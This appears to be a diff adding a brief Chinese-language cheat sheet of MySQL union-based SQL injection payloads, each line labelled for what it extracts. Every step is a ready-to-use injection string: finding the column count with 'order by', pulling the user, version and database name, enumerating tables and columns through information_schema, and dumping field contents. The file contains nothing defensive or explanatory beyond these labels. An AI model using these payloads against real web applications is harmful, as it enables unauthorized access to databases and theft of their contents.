@@ -1,0 +1,14 @@
+爆出字段数：
+order by x
+利用内置函数爆出用户名：
+and 1=2 union select 1,user();
+利用内置函数爆出数据库版本：
+and 1=2 union select 1,version();
+利用内置函数爆出数据库名称：
+and 1=2 union select 1,database();
+爆出表名：
+and 1=2 union select 1,table_name from information_schema.tables where table_schema=database();
+爆出字段名：
+and 1=2 union select 1,group_concat(column_name) from information_schema.columns where table_name=表名的十六进制表示;
+爆出字段内容：
+and 1=2 union select 1,字段名 from 表名;
